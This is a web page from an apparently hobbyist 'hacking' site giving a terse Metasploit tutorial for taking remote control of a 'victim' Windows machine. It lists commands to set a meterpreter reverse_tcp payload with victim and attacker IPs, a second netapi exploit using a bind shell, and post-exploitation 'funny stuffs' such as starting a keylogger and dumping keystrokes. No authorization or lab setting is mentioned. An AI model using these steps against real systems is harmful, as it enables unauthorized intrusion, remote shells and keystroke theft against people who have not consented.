<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>Backtrack Payload</title>
	<base href="{{base_url}}" />
			<meta name="viewport" content="width=1333" />
		<meta name="description" content="1. msfconsole    (start metasploit in backtrack)
2. Service postgresql start  (connect backtrack database from server)
3. Service metasploit start  (connect metasploit databases)
4. search netapi   (searching for avilable attack)
5. set  payload windows/shell_bind_tcp  (After performing the exploit the data run in the victim computer is known as payload.)
6. Show options      (it show the all avilable options)
7. set  Rhost  victim IP  (Rhost means remote host  and victim IP means target IP )
8. exploit  (executing exploit in the victim computer)" />
	<meta name="keywords" content="Backtrack,NetApi,Backtrack-Remote control victim machine using Reverse,TCP,How to hack windows 7 with metasploit" />
		<meta name="generator" content="Zyro - Website Builder" />
	
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
	<script src="js/jquery-1.8.3.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/main.js" type="text/javascript"></script>

	<link href="css/site.css?v=1.0.12" rel="stylesheet" type="text/css" />
	<link href="css/common.css?ts=1433839386" rel="stylesheet" type="text/css" />
	<link href="css/89.css?ts=1433839386" rel="stylesheet" type="text/css" />
	<link rel="shortcut icon" href="http://haktuts.com/gallery/icon-ts1413278622.png" type="image/png" /><meta name="google-site-verification" content="google6bc4eec58925fc74.html" />
	<script type="text/javascript">var currLang = '';</script>		
	<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
	  <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
</head>


<body>{{ga_code}}<div class="root"><div class="vbox wb_container" id="wb_header">
	
<div id="wb_element_instance516" class="wb_element"><ul class="hmenu"><li><a href="Home/" target="_self" title="Home">Home</a></li><li><a href="Free-ethical-hacking-course-online/" target="_self" title="Ethical Hacking">Ethical Hacking</a></li><li><a href="Linux/" target="_self" title="Linux">Linux</a></li><li><a href="Tips-and-tricks/" target="_self" title="Tips and Trick ">Tips and Trick </a><ul><li><a href="how-to-share-internet-without-wifi/" target="_self" title="Windows">Windows</a></li><li><a href="basic-windows-command/" target="_self" title="Windows Shortcut">Windows Shortcut</a></li><li><a href="top-20-notepad-trick/" target="_self" title="Notepad Hacking">Notepad Hacking</a></li><li><a href="list-of-top-cydia-tweaks-for-ios/" target="_self" title="iOS">iOS</a></li><li><a href="how-to-install-kali-linux-nethunter/" target="_self" title="Android">Android</a></li></ul></li><li><a href="download-all-hacking-tools/" target="_self" title="Download">Download</a></li><li><a href="Contact-us/" target="_self" title="Contact us">Contact us</a></li><li><a href="Book/" target="_self" title="Book">Book</a></li><li><a href="Earn-Money/" target="_self" title="Earn Money">Earn Money</a></li><li><a href="http://haktuts.blogspot.in" target="_self" title="Blog">Blog</a></li><li><a href="https://cse.google.com/cse/publicurl?cx=001639366659799729802:vr921b1tgry#gsc.tab=0&amp;gsc.q=haktuts&amp;gsc.sort=" target="_blank" title="Hackers Search Engine">Hackers Search Engine</a></li></ul></div><div id="wb_element_instance517" class="wb_element"><div></div></div><div id="wb_element_instance518" class="wb_element"><a class="wb_button" href="Home/"><span>HaKTuts</span></a></div></div>
<div class="vbox wb_container" id="wb_main">
	
<div id="wb_element_instance519" class="wb_element" style=" overflow: hidden;"><script id="airpushScript" type="text/javascript" src="//ab.airpush.com/apportal/client/airpush.js?siteid=263411&amp;testmode=0&amp;banner360=1&amp;banner=slot1&amp;placementid=0&amp;tp=0">
</script><style type="text/css">
            button{
                width: 250px;
                height: 250px;
                
            }
            table{
                border: 0;

            }
            body{
                margin: 0;
                padding: 0;
            }
        </style><table><tbody><tr><td id="error" style="color: red">
                          <img src="https://airpushmarketing.s3.amazonaws.com/abstract_examples_web.gif" width="250px"></td>
                    </tr></tbody></table></div><div id="wb_element_instance520" class="wb_element"><div style="font-size: 1px; overflow: hidden; line-height: 1px; padding: 0; background: transparent; float: none; position: relative; margin: 1px 0 0 0; width: 100%; height: 1px; left: 0; top: 50%; border-top: 1px solid #303030;"></div></div><div id="wb_element_instance522" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1"><span style="color:#454545;"><strong style="line-height: 30px;">How to remote control victim machine using Reverse_TCP in backtrack.</strong></span></h1>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;">1. msfconsole    (start metasploit in backtrack)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;">2. Service postgresql start  (connect backtrack database from server)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;">3. Service metasploit start  (connect metasploit databases)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;">4. set  payload windows/meterpreter/reverse_tcp </span></p>

<p class="wb-stl-normal"><span style="color:#454545;">(After performing the exploit the data run in the victim computer is known as payload.)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;">5. Show options    (show the all available options)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;">6. set Rhost victim IP  (target IP address)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;">7. set  Lhost host IP     (attacker IP address)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;">8. exploit    (performing exploit in victim computer)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<h2 class="wb-stl-heading2"><span style="color:#454545;">List of funny stuffs after getting remote shell of victim</span></h2>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;">1. Ps    (show the no of process running)</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">2. getuid  (type of authority )</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">3. keyscan  start  (starting the keylogger sniffer)</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">4. Keyscan dump (dumping the keystroke)</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">5. migrate   (use to migrate from  one to another eg: type ps show attacker the list of process running then use “migrate 724” to migrating to 724)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<h3 class="wb-stl-heading3"><span style="color:#454545;">Backtrack(NetApi)</span></h3>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;">1. msfconsole    (start metasploit in backtrack)</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">2. Service postgresql start  (connect backtrack database from server)</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">3. Service metasploit start  (connect metasploit databases)</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">4. search netapi   (searching for avilable attack)</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">5. set  payload windows/shell_bind_tcp  (After performing the exploit the data run in the victim computer is known as payload.)</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">6. Show options      (it show the all avilable options)</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">7. set  Rhost  victim IP  (Rhost means remote host  and victim IP means target IP )</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">8. exploit  (executing exploit in the victim computer)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><span class="wb-stl-special">How to hack windows 7 with metasploit</span></span></p>

<p class="wb-stl-normal"> </p>

<p> </p>
</div><div id="wb_element_instance523" class="wb_element"><img alt="" src="gallery/48322ea6e335440174c1e63f75447909_600x450.png"></div><div id="wb_element_instance524" class="wb_element"><img alt="" src="gallery/382c64b95bf011caa9aaf5268b90a40d_600x113.png"></div><div id="wb_element_instance525" class="wb_element"><img alt="" src="gallery/c02c0e6bcbb3ebbc6ff821c4c2ad0c1c_600x430.png"></div><div id="wb_element_instance526" class="wb_element"><img alt="" src="gallery/1a60953a3d69785253f08120027ed4c7_600x292.png"></div><div id="wb_element_instance527" class="wb_element"><img alt="" src="gallery/7025bd07f3e5eb0f6e924bad2412fee6_600x250.png"></div><div id="wb_element_instance528" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1"><strong>Step 1:</strong></h1>
</div><div id="wb_element_instance529" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1">Step 2:</h1>
</div><div id="wb_element_instance530" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1"><strong>Step 3:</strong></h1>
</div><div id="wb_element_instance531" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1"><strong>Step 4:</strong></h1>
</div><div id="wb_element_instance532" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1"><strong>Step 5:</strong></h1>
</div><div id="wb_element_instance533" class="wb_element" style="width: 100%;">
			<?php
				global $show_comments;
				if (isset($show_comments) && $show_comments) {
					renderComments(89);
			?>
			<script type="text/javascript">
				$(function() {
					var block = $("#wb_element_instance533");
					var comments = block.children(".wb_comments").eq(0);
					var contentBlock = $("#wb_main");
					contentBlock.height(contentBlock.height() + comments.height());
				});
			</script>
			<?php
				} else {
			?>
			<script type="text/javascript">
				$(function() {
					$("#wb_element_instance533").hide();
				});
			</script>
			<?php
				}
			?>
			</div></div>
<div class="vbox wb_container" id="wb_footer" style="height: 161px;">
	
<div id="wb_element_instance521" class="wb_element" style=" line-height: normal;"><h4 class="wb-stl-pagetitle">haktuts © 2014. All Rights Reserved </h4>
</div><div id="wb_element_instance534" class="wb_element" style="text-align: center; width: 100%;"><div class="wb_footer"></div><script type="text/javascript">
			$(function() {
				var footer = $(".wb_footer");
				var html = (footer.html() + "").replace(/^\s+|\s+$/g, "");
				if (!html) {
					footer.parent().remove();
					footer = $("#wb_footer");
					footer.height(100);
				}
			});
			</script></div></div><div class="wb_sbg"></div></div></body>
</html>